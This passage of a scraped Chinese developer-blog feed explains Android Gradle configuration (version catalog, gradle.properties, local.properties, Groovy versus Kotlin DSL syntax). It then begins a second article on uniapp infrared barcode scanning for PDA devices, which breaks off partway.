<span class="hljs-attr">androidx-ui-tooling-preview</span> = { group = <span class="hljs-string">"androidx.compose.ui"</span>, name = <span class="hljs-string">"ui-tooling-preview"</span> }
<span class="hljs-attr">androidx-ui-test-manifest</span> = { group = <span class="hljs-string">"androidx.compose.ui"</span>, name = <span class="hljs-string">"ui-test-manifest"</span> }
<span class="hljs-attr">androidx-ui-test-junit4</span> = { group = <span class="hljs-string">"androidx.compose.ui"</span>, name = <span class="hljs-string">"ui-test-junit4"</span> }
<span class="hljs-attr">androidx-material3</span> = { group = <span class="hljs-string">"androidx.compose.material3"</span>, name = <span class="hljs-string">"material3"</span> }
<span class="hljs-attr">androidx-appcompat</span> = { group = <span class="hljs-string">"androidx.appcompat"</span>, name = <span class="hljs-string">"appcompat"</span>, version.ref = <span class="hljs-string">"appcompat"</span> }
<span class="hljs-attr">material</span> = { group = <span class="hljs-string">"com.google.android.material"</span>, name = <span class="hljs-string">"material"</span>, version.ref = <span class="hljs-string">"material"</span> }

<span class="hljs-section">[plugins]</span>
<span class="hljs-attr">android-application</span> = { id = <span class="hljs-string">"com.android.application"</span>, version.ref = <span class="hljs-string">"agp"</span> }
<span class="hljs-attr">kotlin-android</span> = { id = <span class="hljs-string">"org.jetbrains.kotlin.android"</span>, version.ref = <span class="hljs-string">"kotlin"</span> }
<span class="hljs-attr">kotlin-compose</span> = { id = <span class="hljs-string">"org.jetbrains.kotlin.plugin.compose"</span>, version.ref = <span class="hljs-string">"kotlin"</span> }
<span class="hljs-attr">android-library</span> = { id = <span class="hljs-string">"com.android.library"</span>, version.ref = <span class="hljs-string">"agp"</span> }
</code></pre>
<p>  传统的依赖方式使用 字符串，容易拼写错误。kts的新版本依赖方式IDE 自动补全，Cmd+点击可跳转，并且版本管理更加集中</p>
<h3 data-id="heading-8">gradle.properties</h3>
<pre><code class="hljs language-properties" lang="properties"># -Xmx: jvm最大堆内存（根据机器配置调整，8GB 机器建议 4096m，16GB 建议 8192m）
# -XX:MaxMetaspaceSize: 元空间最大大小
# -XX:+HeapDumpOnOutOfMemoryError: OOM 时生成堆转储
# -Dfile.encoding: 文件编码
org.gradle.jvmargs=-Xmx4096m -XX:MaxMetaspaceSize=1024m -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8

# 并行编译（利用多核 CPU）
org.gradle.parallel=true
# 配置缓存（实验性功能，显著提升速度） Gradle 8.0+ 稳定，强烈推荐开启
org.gradle.configuration-cache=true
# 构建缓存（复用之前的构建结果）
org.gradle.caching=true
# 按需配置  大型多模块项目建议开启
org.gradle.configureondemand=true
# 后台守护进程，避免每次构建都启动 JVM
org.gradle.daemon=true
# 文件监听（增量构建的基础）
org.gradle.vfs.watch=true
# Kotlin Daemon JVM 参数
kotlin.daemon.jvmargs=-Xmx2048m
# 增量编译
kotlin.incremental=true
# Kotlin 编译缓存
kotlin.caching.enabled=true
# Kotlin 编译器执行策略
# in-process: 在 Gradle Daemon 进程中编译（推荐）
# daemon: 使用单独的 Kotlin Daemon（默认）
# out-of-process: 每次新建进程
kotlin.compiler.execution.strategy=in-process

# 并行编译 Kotlin 模块
kotlin.parallel.tasks.in.project=true
# 使用 AndroidX
android.useAndroidX=true
# kotlin代码样式
kotlin.code.style=official
# 自动迁移第三方库到 AndroidX（通常关闭）
android.enableJetifier=false
# 使每个库的 R 类能够命名空间，让R 类只包含库本身声明的资源，不包含库依赖资源，缩小该库 R 类的大小
android.nonTransitiveRClass=true
# 使用新的资源处理器（AAPT2）
android.enableResourceOptimizations=true
# 禁用 PNG 优化（Debug 时可禁用）
# android.enablePngCrunchInDebugVariant=false
# 启用 D8 desugaring
android.enableD8.desugaring=true
# 启用 R8
android.enableR8=true
# 构建缓存
android.enableBuildCache=true

# 版本号（可被脚本读取）
VERSION_NAME=1.0.0
VERSION_CODE=1

# 签名配置（从环境变量读取，不提交到代码仓库）
# KEYSTORE_FILE=/path/to/keystore
# KEYSTORE_PASSWORD=password
# KEY_ALIAS=alias
# KEY_PASSWORD=password

# API 配置
# API_BASE_URL=https://api.example.com

# Maven 仓库用户名密码（不要提交到仓库）
# MAVEN_USERNAME=username
# MAVEN_PASSWORD=password
</code></pre>
<h3 data-id="heading-9">local.properties</h3>
<pre><code class="hljs language-properties" lang="properties"># Android SDK 路径（Android Studio 自动生成）
sdk.dir=/Users/username/Library/Android/sdk
# NDK 路径
ndk.dir=/Users/username/Library/Android/sdk/ndk/25.1.8937393

# 签名配置（敏感信息）
KEYSTORE_FILE=../release.keystore
KEYSTORE_PASSWORD=mypassword
KEY_ALIAS=mykey
KEY_PASSWORD=mypassword

# API Keys（敏感信息）
GOOGLE_MAPS_API_KEY=xxx
</code></pre>
<p>   设置sdk和ndk本地地址，配置打包签名配置等信息</p>
<h2 data-id="heading-10">Gradle的Groovy &amp; Kotlin区别</h2>
<h3 data-id="heading-11">Gradle DSL 的特点</h3>
<p>可读性更高，更加简洁 （模版代码少一些）</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Groovy 和 kotlin都要使用到的 DSL格式，不同于java等代码方式</span>
android {
    compileSdk = <span class="hljs-number">33</span>
    
    <span class="hljs-comment">// 可以使用 Kotlin 的条件判断</span>
    if (project.hasProperty("useNewApi")) {
        defaultConfig {
            minSdk = <span class="hljs-number">24</span>
        }
    }
    
    <span class="hljs-comment">// 可以使用 Kotlin 的循环</span>
    <span class="hljs-built_in">listOf</span>("debug", "release")<span class="hljs-selector-class">.forEach</span> { buildType -&gt;
        <span class="hljs-built_in">println</span>("Processing $buildType")
    }
}

<span class="hljs-comment">// 如果不使用DSL的方式 可能会写成这样 ，稍微复杂了点</span>
val android = project<span class="hljs-selector-class">.extensions</span><span class="hljs-selector-class">.getByType</span>(AndroidExtension::class.java)
android<span class="hljs-selector-class">.setCompileSdk</span>(<span class="hljs-number">33</span>)

val config = <span class="hljs-built_in">DefaultConfig</span>()
config<span class="hljs-selector-class">.setMinSdk</span>(<span class="hljs-number">24</span>)
android<span class="hljs-selector-class">.setDefaultConfig</span>(config)
</code></pre>
<p>   Gradle 主要使用的<strong>内部DSL</strong> （简单说下外部DSL：需要专门的代码注解器比如 Html 和 SQL） ，可以使用 Kotlin的一些语言特性，这里还是要提到一下 Groovy的闭包，</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Gradle 的 android {} 块实际上是：调用 android() 方法, 传入一个闭包作为参数</span>
android {  <span class="hljs-comment">// 闭包</span>
    compileSdk <span class="hljs-number">33</span>
}
<span class="hljs-built_in">android</span>({ 
    compileSdk <span class="hljs-number">33</span> 
})
<span class="hljs-comment">// 完整形态</span>
<span class="hljs-built_in">android</span>(new Closure() {
    void <span class="hljs-built_in">call</span>() {
        compileSdk <span class="hljs-number">33</span>
    }
})
大概得实现逻辑
class AndroidExtension {  <span class="hljs-comment">// 定义 Android 扩展类</span>
    int compileSdk
    
    void <span class="hljs-built_in">defaultConfig</span>(Closure closure) {
        def config = new <span class="hljs-built_in">DefaultConfig</span>()
        closure<span class="hljs-selector-class">.delegate</span> = config  <span class="hljs-comment">// 设置闭包的委托</span>
        <span class="hljs-built_in">closure</span>()                  <span class="hljs-comment">// 闭包</span>
    }
}

<span class="hljs-comment">// 定义配置方法，接收闭包作为参数</span>
def <span class="hljs-built_in">android</span>(Closure closure) {
    def ext = new <span class="hljs-built_in">AndroidExtension</span>()
    closure<span class="hljs-selector-class">.delegate</span> = ext     <span class="hljs-comment">// 设置委托</span>
    <span class="hljs-built_in">closure</span>()                  <span class="hljs-comment">// 闭包</span>
    return ext
}

<span class="hljs-comment">// 使用（看起来像 DSL）</span>
android {
    compileSdk = <span class="hljs-number">33</span>      <span class="hljs-comment">// 实际是在 AndroidExtension 上下文中</span>
    defaultConfig {
        minSdk = <span class="hljs-number">24</span>      <span class="hljs-comment">// 实际是在 DefaultConfig 上下文中</span>
    }
}
</code></pre>
<p>  Kotlin中使用的则是 Lambda方式（如果参数为最后一个，则可以去掉括号），并且Kotlin是使用 = 号来赋值的，相较于 Groovy ，Kotlin是静态类型语言，部分类型不对在编译期就会提示。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">android {  <span class="hljs-comment">// Lambda 表达式</span>
    compileSdk = <span class="hljs-number">33</span>
    defaultConfig {  <span class="hljs-comment">// 嵌套 Lambda</span>
        minSdk = <span class="hljs-number">24</span>
    }
}

<span class="hljs-comment">// android { } 大概实现逻辑，可以理解为 ApplicationExtension.compileSdk = 33</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> org.gradle.api.Project.<span class="hljs-title">android</span><span class="hljs-params">(configure: <span class="hljs-type">org</span>.<span class="hljs-type">gradle</span>.<span class="hljs-type">api</span>.<span class="hljs-type">Action</span>&lt;<span class="hljs-type">com</span>.<span class="hljs-type">android</span>.<span class="hljs-type">build</span>.<span class="hljs-type">gradle</span>.<span class="hljs-type">LibraryExtension</span>&gt;)</span></span>: kotlin.<span class="hljs-built_in">Unit</span> { <span class="hljs-comment">/* compiled code */</span> }

</code></pre>
<p>  看Gradle源码，这里是委托给了 LibraryExtension ，所以compileSdk 字段就是 LibraryExtension 中的一个属性</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/563c63c3c2e44097a5937a73f1aa0b0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO5bed:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765419865&amp;x-signature=u3dOkqH9XnlbqjIHIGy4HqTr2Ws%3D" alt="image.png" loading="lazy"/></p>
<p>  所以 我们可以在Android 大括号里边使用compileSdk等字段的赋值</p>
<h3 data-id="heading-12">Groovy vs Kotlin 语法对比</h3>
<ul>
<li>字符串</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
def str1 = 'Hello world'      // 普通字符串 
def str3 = "Hello $name"       // 字符串插值  可以单引号，也可以双引号
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
<span class="hljs-keyword">val</span> str1 = <span class="hljs-string">"only double quote"</span>  <span class="hljs-comment">// 只能用双引号</span>
<span class="hljs-keyword">val</span> str2 = <span class="hljs-string">"Hello <span class="hljs-variable">$name</span>"</span>        <span class="hljs-comment">// 字符串插值</span>
</code></pre>
<ul>
<li>变量</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
def name = "ymc"               // 动态类型
String name = "ymc"            // 显式类型
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
<span class="hljs-keyword">var</span> name = <span class="hljs-string">"ymc"</span>               <span class="hljs-comment">// 可变</span>
<span class="hljs-keyword">val</span> name = <span class="hljs-string">"ymc"</span>               <span class="hljs-comment">// 不可变（推荐）</span>
</code></pre>
<ul>
<li>方法调用</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
println("Hello")
println "Hello"                 // 可以省略括号

add(1, 2)
add 1, 2                        // 可以省略括号和逗号

implementation 'androidx.core:core-ktx:1.9.0'
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
println(<span class="hljs-string">"Hello"</span>)                <span class="hljs-comment">// 必须有括号</span>

add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)                       <span class="hljs-comment">// 必须有括号</span>

implementation(<span class="hljs-string">"androidx.core:core-ktx:1.9.0"</span>)  <span class="hljs-comment">// 必须有括号</span>
</code></pre>
<ul>
<li>plugins</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
    id 'kotlin-kapt'
}

// 或
apply plugin: 'com.android.application'
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
plugins {
    id(<span class="hljs-string">"com.android.application"</span>)
    id(<span class="hljs-string">"org.jetbrains.kotlin.android"</span>)
    kotlin(<span class="hljs-string">"kapt"</span>)  <span class="hljs-comment">// 等价于 id("org.jetbrains.kotlin.kapt")</span>
}

<span class="hljs-comment">// 或</span>
apply(plugin = <span class="hljs-string">"com.android.application"</span>)
</code></pre>
<ul>
<li>dependencies 块</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
dependencies {
    implementation 'androidx.core:core-ktx:1.9.0'
    implementation group: 'com.google.code.gson', name: 'gson', version: '2.10.1'
    
    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'
    
    testImplementation 'junit:junit:4.13.2'
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
dependencies {
    implementation(<span class="hljs-string">"androidx.core:core-ktx:1.9.0"</span>)
    implementation(group = <span class="hljs-string">"com.google.code.gson"</span>, name = <span class="hljs-string">"gson"</span>, version = <span class="hljs-string">"2.10.1"</span>)
    
    debugImplementation(<span class="hljs-string">"com.squareup.leakcanary:leakcanary-android:2.12"</span>)
    
    testImplementation(<span class="hljs-string">"junit:junit:4.13.2"</span>)
}
</code></pre>
<ul>
<li>android 块</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
android {
    namespace 'com.example.app'
    compileSdk 33
    
    defaultConfig {
        applicationId "com.example.app"
        minSdk 24
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }
    
    buildTypes {
        debug {
            applicationIdSuffix '.debug'
            debuggable true
        }
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
android {
    namespace = <span class="hljs-string">"com.example.app"</span>
    compileSdk = <span class="hljs-number">33</span>
    
    defaultConfig {
        applicationId = <span class="hljs-string">"com.example.app"</span>
        minSdk = <span class="hljs-number">24</span>
        targetSdk = <span class="hljs-number">33</span>
        versionCode = <span class="hljs-number">1</span>
        versionName = <span class="hljs-string">"1.0"</span>
    }
    
    buildTypes {
        debug {
            applicationIdSuffix = <span class="hljs-string">".debug"</span>
            isDebuggable = <span class="hljs-literal">true</span>
        }
        release {
            isMinifyEnabled = <span class="hljs-literal">true</span>
            proguardFiles(
                getDefaultProguardFile(<span class="hljs-string">"proguard-android-optimize.txt"</span>),
                <span class="hljs-string">"proguard-rules.pro"</span>
            )
        }
    }
}
</code></pre>
<p>  前边两段代码，比较明显的不同就是 boolean赋值，kotlin 是is开头，等号赋值</p>
<ul>
<li>集合操作</li>
</ul>
<pre><code class="hljs language-groovy" lang="groovy">// ========== Groovy ==========
ndk {
    abiFilters 'armeabi-v7a', 'arm64-v8a'
}

exclude '**/test/**', '**/*.tmp'
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ========== Kotlin DSL ==========</span>
ndk {
    abiFilters += setOf(<span class="hljs-string">"armeabi-v7a"</span>, <span class="hljs-string">"arm64-v8a"</span>)
}

exclude(<span class="hljs-string">"**/test/**"</span>, <span class="hljs-string">"**/*.tmp"</span>)
</code></pre>
<h2 data-id="heading-13">最后</h2>
<p>  记得22年新版本As就已经推荐使用kotlin来管理 Gradle ，学完后感觉相比于Groovy，kotlin编译期间更加安全，跳转和代码提示 ，更科学的管理类和版本控制。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于uniapp的PDA手持设备红外扫码方案]]></title>    <link>https://juejin.cn/post/7579819594270916646</link>    <guid>https://juejin.cn/post/7579819594270916646</guid>    <pubDate>2025-12-04T09:24:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594270916646" data-draft-id="7579556047784575028" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于uniapp的PDA手持设备红外扫码方案"/> <meta itemprop="keywords" content="前端,uni-app"/> <meta itemprop="datePublished" content="2025-12-04T09:24:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="能不能送我一朵小红花"/> <meta itemprop="url" content="https://juejin.cn/user/1214280466709783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于uniapp的PDA手持设备红外扫码方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1214280466709783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    能不能送我一朵小红花
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:24:39.000Z" title="Thu Dec 04 2025 09:24:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在本篇文章中，可以学习到基于<code>uniapp</code>平台的<code>移动端app</code>应用，通过<code>uts插件</code>调用<code>安卓sdk</code>实现红外扫码功能。</p>
<h3 data-id="heading-1">背景</h3>
<p>移动端最近有一个需求，需要使用PDA的红外扫码功能来识别一些二维码。识别成功后，再进行一些业务操作。因为公司移动端的技术用的是uniapp，没有找到合适的现成库或工具，于是决定自己造，顺带写了这篇文章。</p>
<h3 data-id="heading-2">名词解释</h3>
<h4 data-id="heading-3">PDA设备</h4>
<p>PDA的英文全称叫Personal Digital Assistant，现代意义上的PDA终端手持机是一种集成了数据采集、处理、传输功能的智能终端设备。 如下图就是一个在使用红外扫码功能的PDA手持设备。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4be2b7be51c742e7a14bd476cdb485ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IO95LiN6IO96YCB5oiR5LiA5py15bCP57qi6Iqx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446550&amp;x-signature=ikHDOVVl1Y3GxMmLmZnHm2Ntk6w%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">UTS插件</h4>
<p><code>uts</code>，全称<code>uni type script</code>，统一、强类型、脚本语言，是uni提供的接入原生api、SDK、插件的DSL。</p>
<p>它会被编译为不同平台的编程语言，如：</p>
<ul>
<li><code>web</code>平台，编译为<code>JavaScript</code></li>
<li><code>Android</code>平台，编译为<code>Kotlin</code></li>
<li><code>iOS平台</code>，编译为<code>Swift</code>（HX 3.6.7+ 版本支持）</li>
<li><code>harmonyOS平台</code>，编译为<code>ArkTS</code>（HX 4.22+ 版本支持）在现有架构下，ArkTS和JS在同一环境下执行，不涉及通讯等问题。</li>
</ul>
<p>uts插件，指利用uts语法，操作原生的API（包括手机os的api或三方sdk），并封装成一个<a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fplugin%2Funi_modules.html" target="_blank" title="https://uniapp.dcloud.net.cn/plugin/uni_modules.html" ref="nofollow noopener noreferrer">uni_modules</a>插件，供前端调用。</p>
<p>如果有想要详细了解的同学可以看看官网介绍：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdoc.dcloud.net.cn%2Funi-app-x%2Fplugin%2Futs-plugin.html" target="_blank" title="https://doc.dcloud.net.cn/uni-app-x/plugin/uts-plugin.html" ref="nofollow noopener noreferrer">Uniapp UTS插件</a>。</p>
<hr/>
<h2 data-id="heading-5">需求分析</h2>
<p>本文最终采用的是PDA厂商SDK方案，使用UTS插件接入SDK，最后封装成业务组件。（不关心方案选型，想直接看PDA厂商SDK接入的同学，可以点击目录【具体实现】跳转）</p>
<h3 data-id="heading-6">方案分析</h3>

























<table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>隐藏input代理</td><td><ol><li>通用方案，不需要针对不同的PDA设备编写独立代码。</li><br/><li>开发方案熟悉，基本还是基于web开发的思维。</li></ol></td><td><ol><li>移动端input聚焦的时候会唤起键盘，关闭键盘方案不够好的情况下会导致页面闪烁。</li><br/><li>需要针对处理不同厂商（甚至是同一厂商不同型号）设备的红外扫码按键监听事件。</li></ol></td></tr><tr><td>PDA系统设置扫码广播</td><td><ol><li>用户体验好，效果PDA厂商SDK方案没有差别。</li><br/><li>代码量小，开发简单。</li></ol></td><td><ol><li>需要针对每一台PDA手持设备进行特殊设置，客户体量大的情况下配置PDA手持设备极度麻烦。</li><br/><li>极度依赖PDA厂商的系统设置。</li></ol></td></tr><tr><td>PDA厂商SDK方案</td><td><ol><li>用户体验好，完全静默的红外扫码，依靠消息订阅实现。</li><br/><li>不需要引入额外的js库。</li></ol></td><td><ol><li>针对不同的PDA品牌，需要额外特殊处理。</li><br/><li>较前两个方案复杂，原生SDK接入不是web开发的舒适区。</li></ol></td></tr></tbody></table>
<h3 data-id="heading-7">隐藏input代理方案</h3>
<p>如果要使用隐藏input代理方案，有两个必须要面对的问题：</p>
<ul>
<li>第一个是input聚焦时会唤起键盘</li>
<li>第二个是需要监听PDA手持设备的红外扫码功能的开始与结束。</li>
</ul>
<p>开始具体分析这两个问题。</p>
<h4 data-id="heading-8">如何避免input聚焦唤起键盘</h4>
<p>目前有三种方案可以隐藏唤起键盘或者避免键盘被唤起。隐藏唤起键盘会带来无法避免的页面闪烁问题，所以避免键盘被唤起是最优解。</p>
<ol>
<li>
<p>uniapp提供了<code>hideKeyboard</code>方法用来隐藏键盘，<code>hideKeyboard</code>方法会带来页面闪烁问题。检索到有结合使用<code>setInterval</code>不断隐藏键盘的方案，但是测试结果依旧是会有页面闪烁的情况，不建议使用。如果有同学想了解该方案可以看看<a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fapi%2Fkey.html%23hidekeyboard" target="_blank" title="https://uniapp.dcloud.net.cn/api/key.html#hidekeyboard" ref="nofollow noopener noreferrer">uniapp的官网</a>。</p>
</li>
<li>
<p>使用<code>input</code>组件的属性，来达到聚焦<code>input</code>组件时，不唤起键盘的效果。</p>
<ol>
<li><code>inputmode</code>属性，可以完全屏蔽唤起键盘，但是会丢失PDA扫码结果。</li>
<li><code>readonly</code>属性，app端测试没有效果，无法屏蔽唤起键盘。（有资料说在小程序端有效果，这个我没有做测试，有兴趣的同学可以自己试试。）</li>
</ol>
</li>
<li>
<p>通过原生插件或者uniapp的native.js来修改页面级（activity级别）的键盘唤起模式。（这个方案没有深入尝试，因为既然都需要编写原生相关代码。那使用PDA厂商的SDK，明显获得更好的用户体验，）</p>
</li>
</ol>
<h4 data-id="heading-9">如何监听PDA手持设备的红外扫码功能</h4>
<ol>
<li>监听PDA的键盘事件，需要依赖<code>uniapp</code>的<code>render.js</code>来获取<code>addEventListener</code>，监听键盘事件。</li>
<li>监听PDA手持设备红外扫码功能的广播。（可以询问适配的PDA厂商，有没有开放红外扫码的安卓公共广播。如果没有那就只能针对SDK进行一个二次开发）</li>
</ol>
<p>隐藏<code>input</code>代理方案是一个不错的通用解决方案。但是隐藏键盘带来的页面闪烁问题，会带给用户较差的体验，所以最后的实现方案没有采用该方案。</p>
<h3 data-id="heading-10">PDA系统设置扫码广播解解</h3>
<p>不同的PDA手持设备有着不同的设置方式，这里是一个<a href="https://juejin.cn/post/7491485553029054514" target="_blank" title="https://juejin.cn/post/7491485553029054514">其他同学的方案</a>，想了解该方案的同学可以去看看。</p>
<p>需要针对使用的PDA设备进行独立配置红外扫码功能的系统设置，如果在客户体量大、数量多的情况下，会有大量PDA设置需求。会带来两个问题：</p>
<ul>
<li>第一，客户大概率是不愿意自己进行PDA设置，那么这个设置过程将消耗己方的大量人力。</li>
